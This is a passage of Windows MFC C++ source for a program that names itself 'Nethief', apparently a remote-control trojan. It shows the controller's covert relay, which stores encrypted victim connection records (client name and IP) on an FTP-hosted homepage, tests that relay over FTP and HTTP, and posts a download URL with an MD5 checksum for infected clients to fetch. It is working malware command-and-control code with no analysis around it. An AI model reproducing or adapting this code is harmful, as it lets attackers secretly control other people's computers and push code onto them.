	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('.'));  //找到
	exeFullPath=exeFullPath+".INI";  //源文件名
	int nLength=400;
	///////////////////////////////////////////////////////////
	CString strString;           //用于保存读出的字符串
	GetPrivateProfileString(lpSectionName,lpKeyName,"Error",
		strString.GetBufferSetLength(nLength),nLength,
		exeFullPath.GetBufferSetLength(MAX_PATH));
	strString.ReleaseBuffer();
	return strString;
}

BOOL CCommunity::WriteINIfileString(LPCTSTR lpSectionName, LPCTSTR lpKeyName, LPCTSTR lpString)
{
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('.'));  //找到
	exeFullPath=exeFullPath+".INI";  //源文件名
	return WritePrivateProfileString(lpSectionName,lpKeyName,lpString,
		exeFullPath.GetBufferSetLength(MAX_PATH));
}

//*************************************************************************/
BOOL CCommunity::NotifyClientConnect(CString strClientName)
{
	if(!IsOnline())
		return FALSE;

	if(m_pFtpConn==NULL)
		return FALSE;
	////////////////////////////////
	m_CriticalSection.Lock();

	CLIENT_CONNECT_INFO stClientConnectInfo;
	ZeroMemory(&stClientConnectInfo,sizeof(stClientConnectInfo));
	CStringToChar(stClientConnectInfo.cClientName,strClientName);
	CString strIPAddr=GetBindIP();
	ULONG ulIPAddr=inet_addr(strIPAddr);
	memcpy(stClientConnectInfo.cIPAddress,&ulIPAddr,sizeof(stClientConnectInfo.cIPAddress));

	EncryptData(&stClientConnectInfo,sizeof(stClientConnectInfo),m_strDataPassword);

	TRY
	{
		CInternetFile* pInternetFile=m_pFtpConn->OpenFile(m_strConnectFilename,GENERIC_WRITE);
		pInternetFile->Write(&stClientConnectInfo,sizeof(stClientConnectInfo));
		pInternetFile->Close();
	}
	CATCH_ALL(e)
	{
		if(m_pFtpConn!=NULL)
		{
			m_pFtpConn->Close();
			m_pFtpConn=NULL;
		}

		m_CriticalSection.Unlock();
		return FALSE;
	}
	END_CATCH_ALL
	m_CriticalSection.Unlock();
	////////////////////////////////
	return TRUE;
}

int CCommunity::HomepageTest(CEdit* pEdit_Test)
{
	ShowEditText(pEdit_Test,"开始测试，请稍候...\r\n");
	//////////////////////////////////////////////////////////////////
	ShowEditText(pEdit_Test,"正在检查联机状态...");
	if(!IsOnline())
	{
		ShowEditText(pEdit_Test,"失败！");
		return -1;
	}
	ShowEditText(pEdit_Test,"成功！\r\n");
	//////////////////////////////////////////////////
	ShowEditText(pEdit_Test,"正在以FTP方式登录主页空间...");

	CInternetSession	Session;		//Internet会话
	CFtpConnection*		pFtpConn=NULL;	//FTP连接
	TRY
	{
		pFtpConn=Session.GetFtpConnection(m_strFtpServerAddress,m_strFtpUsername,m_strFtpPassword,21);
	}
	CATCH_ALL(e)
	{
		if(pFtpConn!=NULL)
			pFtpConn->Close();
		Session.Close();

		ShowEditText(pEdit_Test,"失败！");
		return -2;
	}
	END_CATCH_ALL
	if(!pFtpConn->SetCurrentDirectory("./wwwroot"))
	{
		if(!pFtpConn->SetCurrentDirectory("./www"))
		{
			if(!pFtpConn->SetCurrentDirectory("./html"))
			{
				if(!pFtpConn->SetCurrentDirectory("./public_html"))
				{
				}
			}
		}
	}
	//////////////循环调用创建多级子目录////////////////
	if(!pFtpConn->SetCurrentDirectory(m_strFileSavePath))
	{
		CString strDirName=m_strFileSavePath;
		if(strDirName.GetAt(strDirName.GetLength()-1)!='/')
			strDirName+="/";
		CString strTemp=strDirName;
		while(1)
		{
			int nCount=strTemp.Find("/");
			if(nCount!=-1)
			{
				CString strDir=strDirName.Mid(0,nCount+1);
				pFtpConn->CreateDirectory(strDir);
				strTemp.SetAt(nCount,'|');
			}
			else
				break;
		}
		if(!pFtpConn->SetCurrentDirectory(m_strFileSavePath))
		{
			if(pFtpConn!=NULL)
				pFtpConn->Close();
			Session.Close();

			ShowEditText(pEdit_Test,"失败！");
			return -2;
		}
	}	
	//写一个文件
	CString strWriteText="Nethief is testing...!";
	int nWriteTextLength=strWriteText.GetLength();
	EncryptData(strWriteText.GetBuffer(nWriteTextLength),nWriteTextLength,m_strDataPassword);
	strWriteText.ReleaseBuffer();
	TRY
	{
		CInternetFile* pInternetFile=pFtpConn->OpenFile(m_strClientFilename,GENERIC_WRITE);
		pInternetFile->Write(strWriteText.GetBuffer(nWriteTextLength),nWriteTextLength);
		pInternetFile->Close();
	}
	CATCH_ALL(e)
	{
		if(pFtpConn!=NULL)
			pFtpConn->Close();
		Session.Close();

		ShowEditText(pEdit_Test,"失败！");
		return -2;
	}
	END_CATCH_ALL

	if(pFtpConn!=NULL)
		pFtpConn->Close();
	Session.Close();
	ShowEditText(pEdit_Test,"成功！\r\n");
	//////////////////////////////////////////////////
	ShowEditText(pEdit_Test,"正在以HTTP方式访问主页...");

	CString strReadText;
	////////////////////////
	CString strHomepage,strFileSavePath;
	if(m_strHomepage.Right(1)=="/")
		strHomepage=m_strHomepage.Left(m_strHomepage.GetLength()-1);
	else
		strHomepage=m_strHomepage;
	if(m_strFileSavePath.Right(1)!="/")
		strFileSavePath=m_strFileSavePath+"/";
	else
		strFileSavePath=m_strFileSavePath;
	strFileSavePath=strFileSavePath.Mid(1,strFileSavePath.GetLength()-1);
	CString strHttpDirName=strHomepage+strFileSavePath;

	CString strTestFileURL=strHttpDirName+m_strClientFilename;
	////////////////////////
	TRY
	{
		CInternetSession Session;
		CInternetFile* pInternetFile=(CInternetFile*)Session.OpenURL(strTestFileURL,
			NULL,INTERNET_FLAG_TRANSFER_BINARY|INTERNET_FLAG_RELOAD|INTERNET_FLAG_DONT_CACHE);
		pInternetFile->Read(strReadText.GetBufferSetLength(1024),1024);
		strReadText.ReleaseBuffer(nWriteTextLength);
		pInternetFile->Close();
		Session.Close();
	}
	CATCH_ALL(e)
	{
		ShowEditText(pEdit_Test,"失败！");
		return -3;
	}
	END_CATCH_ALL
	
	if(strReadText!=strWriteText)
	{
		ShowEditText(pEdit_Test,"失败！");
		return -3;
	}
	ShowEditText(pEdit_Test,"成功！\r\n");
	//////////////////////////////////////////////////////////////////
	ShowEditText(pEdit_Test,"测试完毕。");
	return 1;
}

BOOL CCommunity::UpdateDownloadSetting(CString strURL,CString strFilename)
{
	if(!IsOnline())
		return FALSE;

	if(m_pFtpConn==NULL)
		return FALSE;
	/////////////////////////////////////////////////
	//读出文件内容
	CFile File(strFilename,CFile::modeRead|CFile::shareDenyNone);

	DWORD dwFileLength=File.GetLength();
	BYTE* pbyFile=new BYTE[dwFileLength];

	File.Read(pbyFile,dwFileLength);
	File.Close();
	/////////////////////////////////////////////////
	//算出MD5校验和
	BYTE byCheckSum[16];
	ZeroMemory(byCheckSum,sizeof(byCheckSum));

	CMd5 Md5;
	Md5.GetMD5CheckSum(pbyFile,dwFileLength,byCheckSum);
	delete[] pbyFile;
	///////////////////////////////////////////////////////////////////////
	DOWNLOAD_FILE_INFO stDownloadFileInfo;
	ZeroMemory(&stDownloadFileInfo,sizeof(stDownloadFileInfo));
	memcpy(stDownloadFileInfo.byCheckSum,byCheckSum,sizeof(byCheckSum));
	CStringToChar(stDownloadFileInfo.cDownloadFileURL,strURL);

	EncryptData(&stDownloadFileInfo,sizeof(stDownloadFileInfo),m_strDataPassword);

	m_CriticalSection.Lock();
	TRY
	{
		CInternetFile* pInternetFile=m_pFtpConn->OpenFile(m_strDownloadFilename,GENERIC_WRITE);
		pInternetFile->Write(&stDownloadFileInfo,sizeof(stDownloadFileInfo));
		pInternetFile->Close();
	}
	CATCH_ALL(e)
	{
		if(m_pFtpConn!=NULL)
		{
			m_pFtpConn->Close();
			m_pFtpConn=NULL;
		}

		m_CriticalSection.Unlock();
		return FALSE;
	}
	END_CATCH_ALL
	m_CriticalSection.Unlock();
	////////////////////////////////
	return TRUE;
}
